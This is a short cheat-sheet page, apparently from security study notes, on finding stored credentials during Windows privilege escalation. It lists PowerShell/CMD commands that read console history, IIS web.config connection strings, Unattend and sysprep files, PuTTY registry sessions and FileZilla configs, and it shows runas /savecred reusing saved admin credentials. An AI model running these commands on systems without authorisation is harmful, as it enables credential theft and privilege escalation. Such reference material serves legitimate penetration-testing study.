# Credentials

[Go back](../index.md#windows-privilege-escalation-)

<div class="row row-cols-md-2"><div>

You may try to look for credentials.

* 🌍 browser history
* 🛣️ [logs](/cybersecurity/blue-team/logs.md)
* 🐚 backups <small>(.old, .bak...)</small>
* ✉️ conversations/mails
* 👜 check the registry <small>(admin required)</small>
* 🔐 command history

```shell!
PS> type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
CMD> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

* ...

Find interesting files

* `/`: look for direct files, or dig into folders such as Users...
* `~/Desktop`: look for documents, passwords...
* `~/Documents`: look for documents, passwords...
* `%appdata%`: look for sensitive applications data
</div><div>

List saved credentials by Windows:

```shell!
PS> cmdkey /list
PS> # use 'admin' saved credentials to start cmd.exe
PS> runas /savecred /user:admin cmd.exe
```

Some known locations:

```powershell
# Internet Information Services (IIS) = the default web server
PS> type C:\inetpub\wwwroot\web.config | findstr connectionString
PS> type C:\Windows\Microsoft.NET\Framework64\vX.X.XXXXX\Config\web.config | findstr connectionString
# Windows Deployment Services (credentials of the admin that
# deployed the OS image to several hosts, referred as "Unattended")
PS> type C:\Unattend.xml
PS> type C:\Windows\Panther\Unattend.xml
PS> type C:\Windows\Panther\Unattend\Unattend.xml
PS> type C:\Windows\system32\sysprep.inf
PS> type C:\Windows\system32\sysprep\sysprep.xml
# Putty
PS> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
# VNC servers
# FileZilla
PS> type C:\xampp\FileZilla Server\FileZilla Server.xml
PS> type C:\Program Files\FileZilla Server\FileZilla Server.xml
```
</div></div>